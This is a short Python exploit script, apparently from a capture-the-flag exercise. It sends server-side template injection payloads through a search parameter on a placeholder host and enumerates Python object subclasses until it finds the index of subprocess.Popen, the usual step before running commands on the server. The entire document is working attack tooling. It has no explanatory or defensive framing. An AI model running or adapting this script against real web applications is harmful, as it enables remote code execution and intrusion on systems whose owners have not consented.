import requests
import re
import html
import time

index = 0
for i in range(170, 1000):
    try:
        url = "http://xxxx/?search={{''.__class__.__mro__[2].__subclasses__()[" + str(i) + "]}}"
        r = requests.get(url)
        res = re.findall("<h2>You searched for:<\/h2>\W+<h3>(.*)<\/h3>", r.text)
        time.sleep(0.1)
        # print(res)
        # print(r.text)
        res = html.unescape(res[0])
        print(str(i) + " | " + res)
        if "subprocess.Popen" in res:
            index = i
            break
    except:
        continue
print("indexo of subprocess.Popen:" + str(index))